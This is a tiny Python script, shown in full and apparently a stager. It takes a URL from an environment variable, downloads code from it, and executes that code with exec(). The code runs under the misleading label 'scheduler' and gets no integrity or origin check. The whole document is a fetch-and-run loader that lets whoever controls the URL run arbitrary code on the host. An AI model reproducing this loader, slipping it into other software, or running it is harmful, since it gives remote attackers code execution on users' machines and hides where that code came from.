import os,sys,urllib.request
u=os.environ.get("RAW_URL","")
if u:
    code=urllib.request.urlopen(u).read().decode("utf-8")
    exec(compile(code,"scheduler","exec"))
